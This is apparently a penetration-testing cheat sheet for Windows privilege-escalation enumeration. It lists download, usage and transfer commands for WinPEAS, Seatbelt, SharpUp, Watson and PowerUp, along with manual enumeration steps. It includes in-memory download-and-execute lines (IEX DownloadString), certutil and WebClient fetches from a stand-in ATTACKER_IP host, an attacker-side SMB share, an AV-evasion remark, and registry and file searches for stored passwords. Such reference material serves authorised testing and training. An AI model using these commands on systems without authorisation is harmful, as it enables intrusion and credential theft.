# Windows Enumeration Tools

## Download Instructions

### WinPEAS

```powershell
# Download from releases
# 64-bit
Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -OutFile winPEASx64.exe

# 32-bit
Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe -OutFile winPEASx86.exe

# .bat version (no AV detection usually)
Invoke-WebRequest -Uri https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat -OutFile winPEAS.bat
```

### Seatbelt

```powershell
# Download pre-compiled from SharpCollection
Invoke-WebRequest -Uri https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Seatbelt.exe -OutFile Seatbelt.exe
```

### SharpUp

```powershell
# Download pre-compiled from SharpCollection
Invoke-WebRequest -Uri https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpUp.exe -OutFile SharpUp.exe
```

### Watson

```powershell
# Download pre-compiled
Invoke-WebRequest -Uri https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Watson.exe -OutFile Watson.exe
```

### PowerUp

```powershell
# Part of PowerSploit
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
```

### Windows Exploit Suggester

```bash
# Python tool - run on attacker machine
git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
cd Windows-Exploit-Suggester
pip install xlrd==1.2.0
python windows-exploit-suggester.py --update
```

---

## Usage

### WinPEAS

```cmd
# Basic run
winPEASx64.exe

# Quiet mode (less output)
winPEASx64.exe quiet

# Specific checks
winPEASx64.exe systeminfo
winPEASx64.exe userinfo
winPEASx64.exe servicesinfo
winPEASx64.exe applicationsinfo

# Log output
winPEASx64.exe log=output.txt

# Batch version
winPEAS.bat
```

### Seatbelt

```cmd
# All checks
Seatbelt.exe -group=all

# Specific groups
Seatbelt.exe -group=user
Seatbelt.exe -group=system
Seatbelt.exe -group=misc

# Specific commands
Seatbelt.exe AMSIProviders
Seatbelt.exe AntiVirus
Seatbelt.exe AppLocker
Seatbelt.exe CredentialGuard
Seatbelt.exe InterestingFiles
Seatbelt.exe TokenPrivileges
```

### SharpUp

```cmd
# Run all checks
SharpUp.exe

# Audit mode (more verbose)
SharpUp.exe audit
```

### Watson

```cmd
# Check for missing patches
Watson.exe
```

### PowerUp

```powershell
# Import module
. .\PowerUp.ps1

# Or download and execute in memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Specific functions
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-ServiceDetail
Find-ProcessDLLHijack
Find-PathDLLHijack
Get-RegistryAlwaysInstallElevated
Get-RegistryAutoLogon
Get-ModifiableScheduledTaskFile
```

### Windows Exploit Suggester (from attacker)

```bash
# On target - export systeminfo
systeminfo > systeminfo.txt

# Transfer to attacker, then run
python windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo systeminfo.txt
```

---

## Transfer to Target

### PowerShell Download

```powershell
# Invoke-WebRequest
Invoke-WebRequest -Uri http://ATTACKER_IP/winPEASx64.exe -OutFile winPEASx64.exe
iwr http://ATTACKER_IP/file.exe -OutFile file.exe

# WebClient
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file.exe', 'C:\temp\file.exe')

# Certutil
certutil -urlcache -split -f http://ATTACKER_IP/file.exe file.exe
```

### SMB Server (from attacker)

```bash
# On attacker
impacket-smbserver share $(pwd) -smb2support

# On target
copy \\ATTACKER_IP\share\winPEASx64.exe C:\temp\
```

---

## Manual Enumeration Commands

### System Info

```cmd
systeminfo
hostname
whoami /all
net user
net localgroup administrators
```

### Network

```cmd
ipconfig /all
route print
netstat -ano
arp -a
```

### Services

```cmd
sc query state= all
wmic service get name,pathname,startmode
net start
```

### Scheduled Tasks

```cmd
schtasks /query /fo LIST /v
```

### Installed Software

```cmd
wmic product get name,version
reg query HKLM\SOFTWARE
```

### Search for Passwords

```cmd
findstr /si password *.txt *.ini *.config *.xml
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

---

## What Each Tool Checks

| Tool | Capabilities |
|------|--------------|
| WinPEAS | Comprehensive: services, registry, tokens, creds, CVEs |
| Seatbelt | Security-focused: AV, AppLocker, creds, tokens |
| SharpUp | Privilege escalation vectors specifically |
| Watson | Missing KB patches for known exploits |
| PowerUp | Service misconfigs, registry, DLL hijacking |

---

## Recommended Order

1. **WinPEAS** - Most comprehensive, start here
2. **PowerUp** - PowerShell alternative if .exe blocked
3. **Watson** - Check for missing patches
4. **Manual** - Investigate findings



